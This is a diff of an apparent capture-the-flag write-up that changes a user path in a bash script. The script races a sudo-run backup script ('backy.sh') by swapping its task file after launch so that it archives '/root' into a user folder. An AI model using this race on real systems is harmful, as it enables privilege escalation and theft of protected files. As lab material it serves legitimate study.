@@ -42,13 +42,13 @@ sudo -l
 ```
 #!/bin/bash
 
-echo '{"directories_to_archive":["/home/martin"],"destination":"/home/martin/backups/"}' > task.json
+echo '{"directories_to_archive":["/home/chall3"],"destination":"/home/chall3/backups/"}' > task.json
 
 sudo /usr/bin/backy.sh task.json &
 
 sleep 0.02
 
-echo '{"directories_to_archive":["/root"],"destination":"/home/martin/backups/"}' > task.json
+echo '{"directories_to_archive":["/root"],"destination":"/home/chall3/backups/"}' > task.json
 
 ```
 
